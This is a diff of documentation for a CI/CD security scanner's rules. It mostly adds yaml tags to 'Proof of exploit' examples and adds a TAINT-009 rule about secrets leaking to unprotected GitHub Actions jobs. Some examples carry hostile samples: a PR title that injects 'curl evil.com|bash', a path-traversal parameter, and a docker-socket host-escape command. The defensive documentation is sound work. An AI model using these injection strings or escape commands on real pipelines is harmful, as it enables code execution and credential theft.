@@ -16070,7 +16167,7 @@ Managed entries in ``<dependencyManagement>`` are NOT evaluated by this rule (th
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: ``resolved`` URL is present but ``integrity``
 // is missing. npm has nothing to compare against at install
 // time, so a registry that swaps the tarball mid-flight
@@ -16123,7 +16220,7 @@ Standard ``https://registry.npmjs.org`` and other registered registries (GitHub 
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: ``resolved`` URL is git+ssh — a fork pulled
 // from an upstream the team can't audit publicly. The
 // branch ``@main`` is mutable; whoever can push to the
@@ -16182,7 +16279,7 @@ This rule guards the *package you're publishing*. To stop *consumed* dependencie
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: every consumer who runs ``npm install`` on
 // this package executes ``setup.js`` with THEIR
 // credentials (``GH_TOKEN``, ``NPM_TOKEN``, AWS env, SSH
@@ -16234,7 +16331,7 @@ Skips entries already routed elsewhere: registry specs (NPM-001), ``file:`` / ``
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: every ``npm install`` re-resolves ``#main``
 // against the upstream repo's HEAD. A push to ``main``
 // (legitimate co-maintainer commit, leaked PAT, hijacked
@@ -16285,7 +16382,7 @@ Skips entries already routed elsewhere: registry specs (NPM-001), ``file:`` / ``
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: package-lock.json carries a compromised
 # version. The current scan flags it because the registry
 # entry matches the (name, version) tuple.
@@ -16343,7 +16440,7 @@ Complements NPM-004 (``package.json`` declares its own install-time hook on the 
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: .npmrc carries the npm default (scripts run).
 # A transitive dep with a malicious postinstall (Shai-Hulud,
 # TanStack, ua-parser-js 2021) executes with the developer's
@@ -16384,7 +16481,7 @@ ignore-scripts=true
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: bumping ``shiny-lib`` to ``4.2.1`` 90
 // minutes after publication is exactly the window in
 // which Shai-Hulud-class compromises live. npm yanks
@@ -16435,7 +16532,7 @@ ignore-scripts=true
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: a patch-level bump of ``axios`` quietly
 // brings in a new transitive that nobody on the team
 // audited. Lockfile pinning closes the bytes-swap window
@@ -16506,7 +16603,7 @@ Wildcard-broad entries (``*``, ``**``, ``./``) are NOT currently flagged — the
 
 **Proof of exploit.**
 
-```
+```yaml
 // Vulnerable: ``files`` ships ``.env`` into the tarball.
 // Anyone who installs the package recovers the AWS key.
 {
@@ -16691,7 +16788,7 @@ A leaked unrestricted publish token enables full package hijack: an attacker pub
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the image index ships per-architecture
 # manifests but no ``attestation-manifest`` sibling. A
 # downstream verifier (cosign verify-attestation,
@@ -16764,7 +16861,7 @@ A leaked unrestricted publish token enables full package hijack: an attacker pub
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the manifest declares a layer with a
 # ``urls:`` field. On pull, the client fetches the layer
 # blob from that arbitrary URL, bypassing the registry's
@@ -16847,7 +16944,7 @@ A leaked unrestricted publish token enables full package hijack: an attacker pub
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``schemaVersion: 1`` predates the digest-
 # pinned design. The client has no way to verify that the
 # pulled blobs match what the registry served; a swapped
@@ -16908,7 +17005,7 @@ Detection scope: the config descriptor digest, every layer descriptor digest (si
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: descriptors pin layers by ``sha1:`` digest.
 # sha1 has had practical collisions since SHAttered (2017).
 # An attacker who produces a colliding blob substitutes a
@@ -16976,7 +17073,7 @@ Detection scope: the config descriptor digest, every layer descriptor digest (si
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a CodeBuild project with no VPC config.
 # The build container runs in AWS's shared VPC with
 # unrestricted outbound internet — exactly the egress
@@ -17038,7 +17135,7 @@ cb.update_project(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: every stage in the pipeline references
 # the pipeline's top-level role. A bad release lands
 # in the Source stage with the same authority as the
@@ -17126,7 +17223,7 @@ When ``--require-hashes`` is present, pip enforces hash pinning for every requir
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: requirements.txt pins the version literal
 # but doesn't pin the artifact bytes. A registry that
 # silently re-publishes ``requests-2.31.0`` with a
@@ -17173,7 +17270,7 @@ Complements DF-021 (Dockerfile ``RUN pip install ``-i http://...``); PYPI-003 ca
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pip resolves every package against a
 # plaintext-HTTP index. Any network attacker between the
 # build runner and the index (compromised corporate proxy,
@@ -17209,7 +17306,7 @@ requests==2.31.0 \
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: every ``pip install -r requirements.txt``
 # resolves ``@main`` against the upstream repo. Whoever
 # can push to ``main`` (legitimate co-maintainer, leaked
@@ -17249,7 +17346,7 @@ If the extra index is a hash-locked internal proxy that serves *both* internal a
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pip queries BOTH indexes for every package
 # name and picks the highest version. ``acme-internal`` is
 # an internal-only package the org publishes to the
@@ -17296,7 +17393,7 @@ requests==2.31.0
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: requirements.txt pins a compromised version.
 ctx==0.2.2
 
@@ -17337,7 +17434,7 @@ ctx==0.2.2
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: pinning to ``shiny-lib==17.0.99`` 2 hours
 # after its publication is exactly the window in which
 # publisher-account compromises live. PyPI yanks malicious
@@ -17396,7 +17493,7 @@ shiny-lib==17.0.98 \
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: any of the four toggles off means a later
 # bucket policy or ACL change can re-expose the bucket.
 # Real incidents (multiple Fortune-500 data spills) trace
@@ -17442,7 +17539,7 @@ s3.put_public_access_block(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: artifact S3 bucket with no server-side
 # encryption configured. Build artifacts (binaries,
 # release tarballs, deploy plans) sit in plaintext;
@@ -17519,7 +17616,7 @@ s3.put_bucket_encryption(
 
 **Proof of exploit.**
 
-```
+```yaml
 # With no protection rule on ``main``, a single compromised
 # maintainer credential is enough to ship a tampered build:
 #
@@ -17553,7 +17650,7 @@ s3.put_bucket_encryption(
 
 **Proof of exploit.**
 
-```
+```yaml
 # With protection but no required reviews, a maintainer can
 # self-approve a tampered change in two clicks:
 #
@@ -17586,7 +17683,7 @@ s3.put_bucket_encryption(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Without code scanning, the only signal that a PR
 # introduces (e.g.) a SQL injection or hardcoded secret
 # comes from the human reviewer:
@@ -17623,7 +17720,7 @@ s3.put_bucket_encryption(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a developer pushes a commit that contains a
 # leaked AWS access key in source code. Without secret
 # scanning enabled, GitHub never surfaces an alert; the
@@ -17688,7 +17785,7 @@ s3.put_bucket_encryption(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``allow_force_pushes: true`` on the
 # default branch's protection. A maintainer (or anyone
 # with write access via a compromised token) can rewrite
@@ -17738,7 +17835,7 @@ s3.put_bucket_encryption(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``allow_deletions: true`` lets anyone with
 # write access delete the default branch entirely. A
 # compromised token (leaked PAT, malicious workflow
@@ -17770,7 +17867,7 @@ s3.put_bucket_encryption(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``enforce_admins: false`` (or its absence)
 # lets repo admins push directly to ``main``, skip
 # required reviews, and bypass status checks. An admin's
@@ -17856,7 +17953,7 @@ s3.put_bucket_encryption(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: secret scanning is enabled but push
 # protection is off. Secrets are surfaced AFTER they hit
 # the remote — the credential is already in history,
@@ -17961,7 +18058,7 @@ s3.put_bucket_encryption(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``default_workflow_permissions: write``
 # means every workflow's ``GITHUB_TOKEN`` starts with
 # repo-write authority. A typo'd ``run:`` (or an
@@ -18002,7 +18099,7 @@ s3.put_bucket_encryption(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``can_approve_pull_request_reviews: true``
 # means a workflow's ``GITHUB_TOKEN`` (or an installation
 # token) can approve a pull request. Combined with the
@@ -18054,7 +18151,7 @@ s3.put_bucket_encryption(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the ``production`` environment has no
 # required reviewers configured. Any workflow that
 # references ``environment: production`` runs without
@@ -18117,7 +18214,7 @@ Complements every branch-protection rule in the pack: without SCM-025, an unaudi
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a write-enabled deploy key sits on the repo
 # for years. The private half lived on a contractor's
 # laptop and was checked into a public gist during a
@@ -18178,7 +18275,7 @@ If the receiving service genuinely cannot handle HTTPS or shared secrets, termin
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the webhook ships events over plaintext
 # HTTP and carries no shared secret. Any network attacker
 # between GitHub and the receiver sniffs the event
@@ -18231,7 +18328,7 @@ Requires admin scope on the repo to enumerate the outside-collaborator list; wit
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: an outside collaborator (a contractor, a
 # departed employee whose access wasn't fully revoked,
 # a security-researcher allowed in for a one-off audit)
@@ -18311,7 +18408,7 @@ Rulesets in non-active enforcement modes are skipped — SCM-029 owns the not-en
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the repo ruleset names a bypass actor with
 # ``bypass_mode: always``. That actor (typically the
 # ``github-actions[bot]`` or an internal automation
@@ -18376,7 +18473,7 @@ SCM-032 evaluates rulesets in isolation: it does not consult legacy branch-prote
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the ruleset is enforced (governance theater
 # checks pass) but doesn't include a ``pull_request``
 # rule. Pushes to ``main`` still require a PR (via
@@ -18693,7 +18790,7 @@ Generate a fine-grained token at ``github.com/settings/personal-access-tokens/ne
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: AWS Signer profile is revoked or
 # inactive. Code-signing pipelines that route through
 # this profile silently fail (or fall back to
@@ -18746,7 +18843,7 @@ lambdacli.update_code_signing_config(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a Secrets Manager secret with no rotation
 # configured. The credential lives forever; any leak
 # (log echo, accidental commit, .env file in an artifact)
@@ -18780,7 +18877,7 @@ sm.rotate_secret(
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: Secrets Manager resource policy with
 # ``Principal: '*'``. Anyone (no auth required) can
 # call GetSecretValue. Equivalent to publishing the
@@ -18829,7 +18926,7 @@ sm.delete_resource_policy(SecretId='prod/db-master')
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: secret-named parameter stored as plain ``String``.
 $ aws ssm put-parameter \
     --name /prod/api/GITHUB_TOKEN \
@@ -18887,7 +18984,7 @@ v1 limitations: only same-job step outputs are tracked; ``jobs.<id>.outputs.*`` 
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a producer step writes
 # ``$GITHUB_OUTPUT`` from an untrusted source
 # (``github.event.issue.title`` / ``github.head_ref``);
@@ -18948,7 +19045,7 @@ Same-step interpolations (the producer's own use of ``${{ github.event.* }}`` in
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: an ``extract`` job exposes an untrusted
 # value via ``jobs.extract.outputs:`` and a downstream
 # job consumes it via ``needs.extract.outputs.title``
@@ -19009,7 +19106,7 @@ When the callee body is loaded into the same scan (local ``./.github/workflows/<
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the caller workflow passes an untrusted
 # value into a reusable workflow's ``with:`` inputs. The
 # reusable workflow inlines the input into a shell
@@ -19073,7 +19170,7 @@ v1 limitations: ``extends:`` job-template inheritance and cross-pipeline ``inclu
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: an ``extract`` job writes an untrusted
 # source (``$CI_COMMIT_MESSAGE``) into a dotenv report
 # artifact. GitLab automatically loads dotenv reports
@@ -19126,7 +19223,7 @@ Buildkite meta-data is per-build, not per-step; any step in the same build can r
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a PR titled ``shiny new feature";curl
 # evil.com|bash;"`` lands in the meta-data store via the
 # producer step. The consumer step reads it back into
@@ -19181,7 +19278,7 @@ Body resolution: inline ``taskSpec:`` blocks are walked directly; ``taskRef: { n
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: Task ``extract`` writes the PR title to a
 # Tekton ``result``; Task ``use`` reads it back and
 # inlines it into a shell command. A PipelineRun whose
@@ -19257,7 +19354,7 @@ v1 limitations: ``workflowTemplateRef:`` cross-document references aren't resolv
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: producer template hands a tainted parameter
 # through outputs.parameters; consumer interpolates it into
 # its own shell.
@@ -19353,7 +19450,7 @@ v1 limitations: ``include:`` cross-pipeline file inclusion isn't tracked yet (wo
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: hidden template ``.base`` interpolates
 # ``$CI_COMMIT_TITLE`` (attacker-controllable via MR
 # title) into a ``variables:`` block. Job ``build``
@@ -19388,6 +19485,65 @@ build:
 
 **Source:** [`TAINT-008`](../providers/gitlab.md#taint-008) in the [GitLab CI provider](../providers/gitlab.md).
 
+### `TAINT-009`: Environment-protected secret flows to unprotected job <span class="pg-sev pg-sev--high">HIGH</span> { #detail-taint-009 }
+
+**Evidences:** [`6.5.1`](#ctrl-6-5-1) Changes to system components follow secure development procedures, [`8.2.1`](#ctrl-8-2-1) Strong unique identifiers are assigned to each user and service account.
+
+**How this is detected.** Detects the pattern where a ``jobs.<id>.outputs:`` mapping interpolates ``${{ secrets.* }}`` (or a step output that was populated from a secret) and the producing job has an ``environment:`` binding while at least one consuming job (via ``needs:``) does not.
+
+The rule performs a conservative check: it flags when the output *value expression* directly references ``${{ secrets.* }}`` or when a step output referenced by the job output was set from a ``${{ secrets.* }}`` context in the step's ``run:`` or ``env:`` block. Indirect flows through multiple env-var hops within the same job are not tracked (the TAINT-002 engine handles general taint propagation).
+
+The ``needs:`` graph is walked transitively: if job A (environment-bound, secret in outputs) feeds job B (no environment) which feeds job C (no environment), both B and C are flagged if they reference the tainted output.
+
+**Recommendation.** Add an ``environment:`` binding to every job that consumes outputs carrying secret-derived values. If the downstream job needs the secret but should not go through the same review gate, create a separate environment with appropriate protection rules. Alternatively, restructure the workflow so the secret never leaves the environment-bound job's boundary: perform the deploy or credential-consuming operation in the same protected job instead of passing the secret through outputs.
+
+**Known false positives.**
+
+- Workflows that intentionally pass non-sensitive environment-specific values (e.g. a deployment URL) through outputs from an environment-bound job. The rule fires on any ``${{ secrets.* }}`` reference in the output value, which may include non-sensitive configuration stored in environment secrets for convenience.
+
+**Proof of exploit.**
+
+```yaml
+# Vulnerable: the ``mint`` job reads a production secret
+# behind an environment gate and passes it to ``deploy``
+# which has no environment binding.
+on: push
+jobs:
+  mint:
+    runs-on: ubuntu-latest
+    environment: production
+    outputs:
+      token: ${{ steps.get.outputs.token }}
+    steps:
+      - id: get
+        run: echo "token=${{ secrets.DEPLOY_TOKEN }}" >> "$GITHUB_OUTPUT"
+  deploy:
+    needs: mint
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -H "Authorization: ${{ needs.mint.outputs.token }}" https://deploy.example.com
+
+# Safe: the deploy job also binds the same environment.
+on: push
+jobs:
+  mint:
+    runs-on: ubuntu-latest
+    environment: production
+    outputs:
+      token: ${{ steps.get.outputs.token }}
+    steps:
+      - id: get
+        run: echo "token=${{ secrets.DEPLOY_TOKEN }}" >> "$GITHUB_OUTPUT"
+  deploy:
+    needs: mint
+    environment: production
+    runs-on: ubuntu-latest
+    steps:
+      - run: curl -H "Authorization: ${{ needs.mint.outputs.token }}" https://deploy.example.com
+```
+
+**Source:** [`TAINT-009`](../providers/github.md#taint-009) in the [GitHub Actions provider](../providers/github.md).
+
 ### `TF-001`: Plan declares aws_iam_access_key (long-lived credential) <span class="pg-sev pg-sev--high">HIGH</span> { #detail-tf-001 }
 
 **Evidences:** [`8.2.1`](#ctrl-8-2-1) Strong unique identifiers are assigned to each user and service account.
@@ -19398,7 +19554,7 @@ build:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: every ``terraform apply`` provisions a long-
 # lived access key and lands the literal
 # ``aws_iam_access_key.ci.secret`` in the state file. Remote
@@ -19459,7 +19615,7 @@ resource "aws_iam_role" "ci" {
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the password literal lands in the Terraform
 # state file on every apply. Remote S3 backends store state
 # in plaintext unless explicitly encrypted; CI runs that
@@ -19506,7 +19662,7 @@ resource "aws_db_instance" "prod" {
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``map_public_ip_on_launch = true`` on the
 # subnet means CodeBuild containers get a public IP for the
 # duration of the build. The build host is now reachable
@@ -19559,7 +19715,7 @@ resource "aws_route_table_association" "build" {
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``ubuntu:22.04`` is a mutable tag. Whoever
 # controls the registry can repoint it on the next 22.04.x
 # refresh; the next TaskRun pulls the swap silently.
@@ -19598,7 +19754,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``securityContext.privileged: true`` gives
 # the step container full kernel-namespace access on the
 # node. A workload compromise becomes a node-level shell
@@ -19644,7 +19800,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``$(params.revision)`` is substituted into
 # the script literally before the shell parses it. A
 # PipelineRun whose ``revision`` param is
@@ -19696,7 +19852,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: mounting ``/var/run/docker.sock`` into a
 # step gives the Task root access to the node's Docker
 # API. ``docker run --privileged -v /:/host`` from inside
@@ -19746,7 +19902,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: the AWS access key literal lives in the
 # Task manifest. ``kubectl get task -o yaml`` exposes it;
 # the manifest is committed to git for any repo reader.
@@ -19823,7 +19979,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``curl | bash`` trusts the network path AND
 # the installer host. A MITM (compromised proxy, malicious
 # DNS) or a publisher compromise ships malicious code into
@@ -19910,7 +20066,7 @@ spec:
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: a sidecar runs alongside every step in the
 # Task and shares the pod's volumes / network. A
 # privileged sidecar can escape to the node the same way
@@ -19973,7 +20129,7 @@ The detection scans the step-level ``workspaces:`` list (``spec.steps[*].workspa
 
 **Proof of exploit.**
 
-```
+```yaml
 # Vulnerable: ``$(params.target)`` is substituted into
 # the workspace ``subPath`` literally. A PipelineRun with
 # ``target: ../../../etc/secrets`` (or similar traversal)
